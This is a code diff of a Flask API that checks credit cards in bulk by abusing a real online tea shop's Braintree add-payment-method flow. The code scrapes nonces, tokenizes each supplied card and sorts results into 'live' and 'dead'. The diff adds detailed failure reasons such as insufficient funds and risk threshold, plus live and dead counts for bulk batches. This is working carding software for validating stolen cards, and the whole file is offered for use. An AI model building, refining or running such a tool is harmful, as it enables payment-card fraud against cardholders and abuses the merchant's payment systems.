@@ -10,12 +10,10 @@ import re
 
 app = Flask(__name__)
 
-def generate_random_string(length=10):
-    chars = string.ascii_letters + string.digits
-    return ''.join(random.choice(chars) for _ in range(length))
-
 def braintree_check(ccn, mm, yy, cvc):
-    """Braintree CC Check - Returns 'live' or 'dead'"""
+    """Complete Braintree CC Check with proper step validation"""
+    
+    start_time = time.time()
     
     if len(yy) == 2:
         yy = '20' + yy
@@ -25,7 +23,7 @@ def braintree_check(ccn, mm, yy, cvc):
         'sbjs_migrations': '1418474375998%3D1',
         'sbjs_current_add': 'fd%3D2025-10-24%2007%3A53%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
         'sbjs_first_add': 'fd%3D2025-10-24%2007%3A53%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
         'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
         'woocommerce_current_currency': 'GBP',
         '_ga': 'GA1.1.1754434682.1761294191',
@@ -61,30 +59,37 @@ def braintree_check(ccn, mm, yy, cvc):
     }
 
     try:
-        # Step 1: Get page and extract nonces
+        # STEP 1: GET PAYMENT PAGE (MUST SUCCEED)
+        page_start = time.time()
         page_response = requests.get(
             'https://www.tea-and-coffee.com/account/add-payment-method-custom',
             headers=headers,
             cookies=cookies,
-            timeout=30
+            timeout=15
         )
-        page_response.raise_for_status()
+        
+        # Check if page loaded properly
+        if page_response.status_code != 200:
+            return "dead - page load failed"
+            
         page_content = page_response.text
-
-        # Extract nonces using regex only - NO LXML NEEDED
+        
+        # Check if response too fast (indicates failure)
+        if time.time() - page_start < 2:
+            return "dead - fast response"
+        
+        # STEP 2: EXTRACT NONCES (CRITICAL STEP)
         nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', page_content)
         if not nonce_match:
-            return "dead"
-
+            return "dead - nonce not found"
         woocommerce_nonce = nonce_match.group(1)
 
         client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', page_content)
         if not client_nonce_match:
-            return "dead"
-
+            return "dead - client nonce not found"
         client_nonce = client_nonce_match.group(1)
 
-        # Step 2: Get client token
+        # STEP 3: GET CLIENT TOKEN
         token_payload = {
             'action': 'wc_braintree_credit_card_get_client_token',
             'nonce': client_nonce,
@@ -95,23 +100,31 @@ def braintree_check(ccn, mm, yy, cvc):
             headers=headers,
             cookies=cookies,
             data=token_payload,
-            timeout=30
+            timeout=15
         )
-        token_response.raise_for_status()
+        
+        if token_response.status_code != 200:
+            return "dead - token failed"
+            
         token_data = token_response.json()
 
         if not token_data.get('success'):
-            return "dead"
+            return "dead - token not successful"
 
         client_token_encoded = token_data.get('data')
         if not client_token_encoded:
-            return "dead"
+            return "dead - no client token"
 
-        # Decode client token
-        client_token_decoded = json.loads(base64.b64decode(client_token_encoded))
-        authorization_fingerprint = client_token_decoded.get('authorizationFingerprint')
+        # STEP 4: DECODE CLIENT TOKEN
+        try:
+            client_token_decoded = json.loads(base64.b64decode(client_token_encoded))
+            authorization_fingerprint = client_token_decoded.get('authorizationFingerprint')
+            if not authorization_fingerprint:
+                return "dead - no auth fingerprint"
+        except:
+            return "dead - token decode failed"
 
-        # Step 3: Tokenize credit card
+        # STEP 5: TOKENIZE CREDIT CARD
         session_id = str(uuid.uuid4())
         braintree_headers = {
             'Content-Type': 'application/json',
@@ -146,17 +159,22 @@ def braintree_check(ccn, mm, yy, cvc):
             'https://payments.braintree-api.com/graphql',
             headers=braintree_headers,
             json=tokenize_payload,
-            timeout=30
+            timeout=15
         )
-        tokenize_response.raise_for_status()
+        
+        if tokenize_response.status_code != 200:
+            return "dead - tokenize failed"
+
         tokenize_data = tokenize_response.json()
 
         if 'errors' in tokenize_data:
-            return "dead"
+            return "dead - tokenize error"
 
         payment_token = tokenize_data['data']['tokenizeCreditCard']['token']
+        if not payment_token:
+            return "dead - no payment token"
 
-        # Step 4: Add payment method
+        # STEP 6: ADD PAYMENT METHOD (FINAL STEP)
         form_headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
@@ -198,21 +216,35 @@ def braintree_check(ccn, mm, yy, cvc):
             headers=form_headers,
             cookies=cookies,
             data=form_data,
-            timeout=30
+            timeout=15
         )
 
         response_text = payment_response.text
 
-        # FINAL STATUS CHECK
+        # FINAL VALIDATION - CHECK SUCCESS MESSAGE
         if 'Nice! New payment method added' in response_text or 'Payment method successfully added.' in response_text:
-            return "live"  # ✅ CARD APPROVED
+            total_time = time.time() - start_time
+            print(f"SUCCESS: Card processed in {total_time:.2f}s")
+            return "live"  # ✅ PAYMENT METHOD SUCCESSFULLY ADDED
         else:
-            return "dead"  # ❌ CARD DEAD
+            # Check for specific error messages
+            if 'risk_threshold' in response_text or 'RISK_BIN' in response_text:
+                return "dead - risk threshold"
+            elif 'Insufficient funds' in response_text:
+                return "dead - insufficient funds" 
+            elif 'Invalid' in response_text:
+                return "dead - invalid card"
+            else:
+                return "dead - payment failed"
 
+    except requests.exceptions.Timeout:
+        return "dead - timeout"
+    except requests.exceptions.ConnectionError:
+        return "dead - connection error"
     except Exception as e:
-        return "dead"
+        return f"dead - system error"
 
-# API ENDPOINTS
+# REST OF THE API CODE REMAINS SAME...
 @app.route('/check', methods=['GET'])
 def check_cc_single():
     try:
@@ -262,8 +294,8 @@ def check_cc_bulk():
         
         return jsonify({
             'total_cards': len(results),
-            'live_cards': len([r for r in results if r['status'] == 'live']),
-            'dead_cards': len([r for r in results if r['status'] == 'dead']),
+            'live_cards': len([r for r in results if 'live' in r['status']]),
+            'dead_cards': len([r for r in results if 'dead' in r['status']]),
             'results': results
         })
         
